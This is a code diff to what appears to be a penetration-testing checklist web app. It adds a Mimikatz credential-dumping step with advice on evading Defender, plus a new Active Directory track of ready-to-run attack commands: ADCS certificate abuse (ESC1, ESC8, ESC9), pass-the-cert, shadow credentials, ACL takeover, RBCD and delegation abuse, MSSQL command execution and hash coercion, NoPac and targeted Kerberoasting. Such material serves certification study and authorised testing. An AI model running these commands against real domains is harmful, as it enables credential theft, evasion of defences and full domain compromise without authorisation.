@@ -551,7 +551,7 @@ body.overlay-open{overflow:hidden}
 <script>
 const COL={recon:"#38bdf8",web:"#2dd4bf",linux:"#f59e0b",windows:"#60a5fa",
            ad:"#c084fc",pivot:"#f472b6",bof:"#fb7185",pw:"#a3e635",av:"#94a3b8",
-           container:"#22d3ee"};
+           container:"#22d3ee",adcs:"#e879f9"};
 
 const TRACKS=[
 /* ============================ RECON ============================ */
@@ -734,7 +734,8 @@ const TRACKS=[
  ],branch:["SYSTEM \u2192 loot phase","Domain-joined after all (creds/domain seen) \u2192 Active Directory track"]},
  {n:4,title:"Loot",tag:"post-exploit",goal:"Prove it and dump creds",steps:[
    {d:"Grab proof with context",c:"type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & ipconfig",l:"Flag plus whoami and ipconfig in one screenshot."},
-   {d:"Dump local hashes",c:"impacket-secretsdump -sam sam.hive -system system.hive LOCAL",l:"Or secretsdump remotely with admin creds. Reuse local admin hash across other hosts."}
+   {d:"Dump local hashes",c:"impacket-secretsdump -sam sam.hive -system system.hive LOCAL",l:"Or secretsdump remotely with admin creds. Reuse local admin hash across other hosts."},
+   {d:"Mimikatz: pull cleartext creds and tickets from memory",c:"mimikatz # privilege::debug\nsekurlsa::logonpasswords\nsekurlsa::tickets /export\nlsadump::sam",l:"As local admin/SYSTEM. <code>sekurlsa::logonpasswords</code> dumps cleartext and NTLM from LSASS; <code>lsadump::dcsync /user:krbtgt</code> on a DC. <b>Defender flags mimikatz on disk</b> \u2014 run it in memory (Invoke-Mimikatz) or dump LSASS with <code>procdump</code>/<code>comsvcs.dll</code> and parse offline with <code>pypykatz</code>."}
  ]}
 ]},
 
@@ -768,6 +769,50 @@ const TRACKS=[
    {d:"DCSync to pull the krbtgt and admin hashes",c:"impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP}",l:"Needs replication rights (Domain Admin, or an ACL that grants it). Dumps the whole domain."},
    {d:"Log in as Administrator and grab proof",c:"evil-winrm -i {IP} -u Administrator -H <admin-nt-hash>",l:"Golden ticket with the krbtgt hash gives durable domain-wide access if you need persistence."}
  ],branch:["Child/parent or forest trust visible \u2192 escalate across the trust (SID history)","Other subnets reachable \u2192 Pivoting track"]}
+]},
+
+/* ============================ AD CERTS & DELEGATION ============================ */
+{id:"adcs",name:"AD certs & delegation",colour:COL.adcs,
+ blurb:"Post-OSCP Active Directory: certificate services (ADCS), delegation, coercion and MSSQL. Reach for this when the core AD track stalls and BloodHound shows a cert or delegation edge.",
+ phases:[
+ {n:1,title:"ADCS: find vulnerable templates",tag:"recon",goal:"Enumerate the CA and its templates for an ESC",steps:[
+   {d:"Enumerate with certipy (any domain creds)",c:"certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -stdout -vulnerable",l:"Flags each template ESC1\u2013ESC16. Note the <b>CA name</b> and the <b>template name</b> \u2014 you need both to request. Use <code>-hashes :NTHASH</code> instead of <code>-p</code> to authenticate with a hash."},
+   {d:"No creds yet? the web-enrollment endpoint is a tell",c:"curl -sI http://{IP}/certsrv/    # 401 = ADCS web enrollment present (ESC8 candidate)",l:"<code>certsrv</code> over HTTP is the relay target for ESC8."}
+ ],
+  tips:["ESC1 (arbitrary SAN), ESC8 (HTTP relay) and ESC4 (weak template ACL) are the common ones \u2014 certipy names the exact ESC in its output.","BloodHound (with the certipy/Certipy-BloodHound collector) also draws the cert paths."]},
+ {n:2,title:"ESC1 \u2014 request a cert as anyone",tag:"privesc",goal:"Enrol a certificate with an arbitrary SAN, then authenticate as admin",steps:[
+   {d:"Request the cert for the administrator UPN",c:"certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -ca <CA-NAME> -template <VULN-TEMPLATE> -upn administrator@{DOMAIN}",l:"ESC1 = the template allows a client-auth cert with an arbitrary <code>subjectAltName</code>. Saves <code>administrator.pfx</code>."},
+   {d:"Only computers can enrol? add a machine account first",c:"addcomputer.py '{DOMAIN}/{USER}:{PASS}' -method LDAPS -computer-name df -computer-pass df0xdf0xdf -dc-ip {IP}",l:"Default <code>MachineAccountQuota</code> lets any user add 10 computers. Then <code>certipy req</code> with <code>-username 'df$' -password df0xdf0xdf</code> and add <code>-dns {DOMAIN}</code> (the <i>Authority</i> pattern)."},
+   {d:"Turn the cert into a hash / TGT",c:"certipy auth -pfx administrator.pfx -dc-ip {IP}",l:"Returns the NT hash and a TGT \u2014 pass-the-hash from there. If it errors <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> the DC has no PKINIT: use pass-the-cert (next phase)."}
+ ],branch:["Got the admin hash \u2192 Pass the hash (core AD track), or secretsdump"]},
+ {n:3,title:"Pass-the-cert (PKINIT not supported)",tag:"privesc",goal:"Use the certificate over LDAP when Kerberos auth fails",steps:[
+   {d:"Split the pfx into crt + key",c:"certipy cert -pfx administrator.pfx -nocert -out admin.key; certipy cert -pfx administrator.pfx -nokey -out admin.crt",l:"<code>passthecert</code> wants the certificate and key as separate files."},
+   {d:"LDAP shell with the certificate",c:"passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain {DOMAIN} -dc-ip {IP}",l:"In the shell, add yourself to Domain Admins or grant DCSync. The <i>Authority</i> path."}
+ ]},
+ {n:4,title:"ESC8 \u2014 relay to web enrollment",tag:"privesc",goal:"Coerce the DC and relay its auth to the CA for a DC certificate",steps:[
+   {d:"Stand up the relay to the CA's certsrv",c:"certipy relay -target 'http://<CA-HOST>' -template DomainController",l:"Or <code>ntlmrelayx.py -t http://&lt;CA&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code>."},
+   {d:"Coerce the DC to authenticate to you",c:"coercer coerce -u {USER} -p {PASS} -t {IP} -l {LHOST}",l:"Or <code>PetitPotam.py</code> / <code>printerbug.py</code>. The DC's Net-NTLM is relayed, you get a DC certificate, then <code>certipy auth</code> for the DC hash \u2192 DCSync."}
+ ]},
+ {n:5,title:"Shadow credentials & ACL edges",tag:"privesc",goal:"Turn a GenericWrite / WriteOwner edge into a hash",steps:[
+   {d:"Shadow Credentials on a target you can write",c:"certipy shadow auto -u {USER}@{DOMAIN} -p {PASS} -account <target-user> -dc-ip {IP}",l:"Adds a key credential to <code>msDS-KeyCredentialLink</code> and pulls the target's NT hash back. Needs GenericWrite/GenericAll over the target (BloodHound shows it). <code>pywhisker</code> + <code>PKINITtools</code> is the manual route."},
+   {d:"WriteOwner \u2192 take the object, then grant yourself rights",c:"owneredit.py -action write -new-owner {USER} -target '<group>' {DOMAIN}/{USER}:{PASS} -dc-ip {IP}; dacledit.py -action write -rights WriteMembers -principal {USER} -target '<group>' {DOMAIN}/{USER}:{PASS} -dc-ip {IP}",l:"Then <code>net rpc group addmem</code> to add yourself. <code>bloodyAD</code> does it in one tool: <code>bloodyAD --host {IP} -d {DOMAIN} -u {USER} -p {PASS} add groupMember '&lt;group&gt;' {USER}</code>."},
+   {d:"ESC9 / ESC10 \u2014 UPN manipulation",c:"certipy account update -u {USER}@{DOMAIN} -p {PASS} -user <target> -upn administrator@{DOMAIN}",l:"With GenericWrite over a user, set their UPN to administrator, request a cert as them, then restore the UPN. The <i>Certified</i> path."}
+ ]},
+ {n:6,title:"Delegation & RBCD",tag:"privesc",goal:"Abuse Kerberos delegation for a privileged ticket",steps:[
+   {d:"RBCD \u2014 write msDS-AllowedToActOnBehalfOfOtherIdentity",c:"rbcd.py -delegate-from 'df$' -delegate-to '<target>$' -action write '{DOMAIN}/{USER}:{PASS}' -dc-ip {IP}",l:"Needs GenericWrite/GenericAll over the target computer. <code>df$</code> is a machine account you control (<code>addcomputer.py</code>)."},
+   {d:"S4U to impersonate an admin to the target",c:"getST.py -spn 'cifs/<target-fqdn>' -impersonate administrator '{DOMAIN}/df$:df0xdf0xdf' -dc-ip {IP}",l:"Also the play for constrained delegation. Then <code>export KRB5CCNAME=administrator.ccache</code> and <code>psexec.py -k -no-pass &lt;target-fqdn&gt;</code>."},
+   {d:"Unconstrained delegation \u2014 coerce and capture a TGT",c:"krbrelayx.py -hashes :<hash>   # then coerce the DC: printerbug.py '{DOMAIN}/{USER}:{PASS}'@<deleg-host> {LHOST}",l:"The DC's TGT lands in your listener; extract it and DCSync."}
+ ],branch:["Got a ccache / hash \u2192 psexec.py -k / secretsdump (core AD track)"]},
+ {n:7,title:"MSSQL",tag:"attack",goal:"From MSSQL creds to code execution, hashes and linked servers",steps:[
+   {d:"Connect (SQL or Windows auth)",c:"impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth",l:"Drop <code>-windows-auth</code> for a SQL login like <code>sa</code>. A blank or weak <code>sa</code> password is common."},
+   {d:"Enable xp_cmdshell for code execution",c:"enable_xp_cmdshell; EXEC xp_cmdshell 'whoami'",l:"Needs sysadmin. <code>mssqlclient</code> has <code>enable_xp_cmdshell</code> built in."},
+   {d:"Coerce a Net-NTLMv2 hash (no sysadmin needed)",c:"EXEC xp_dirtree '\\\\{LHOST}\\share', 1, 1    # Responder running",l:"Any login can do this \u2014 crack the service-account hash or relay it. <i>Escape</i>'s foothold."},
+   {d:"Hop linked servers",c:"enum_links; use_link [<SERVER>]    # then EXECUTE AS LOGIN='sa', or exec on the far side",l:"Linked servers often run as sa on the remote instance. <code>EXEC ('&lt;query&gt;') AT [&lt;SERVER&gt;]</code> runs SQL there \u2014 chain them to reach a sysadmin context."}
+ ]},
+ {n:8,title:"Other quick wins",tag:"attack",goal:"Fast domain-wide checks worth trying",steps:[
+   {d:"NoPac (CVE-2021-42278 / 42287)",c:"noPac.py {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -dc-host <DC-NAME> --impersonate administrator -shell",l:"Machine-account name confusion \u2192 SYSTEM shell on the DC. Worth trying early against unpatched 2019 DCs."},
+   {d:"Targeted Kerberoast (GenericWrite on a user)",c:"targetedKerberoast.py -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {IP}",l:"Sets a temporary SPN on a user you can write, roasts it, then removes the SPN \u2014 reaches accounts that have no SPN of their own."}
+ ]}
 ]},
 
 /* ============================ PIVOTING ============================ */
@@ -965,7 +1010,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.2.2";
+const APP_VERSION="1.3.0";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
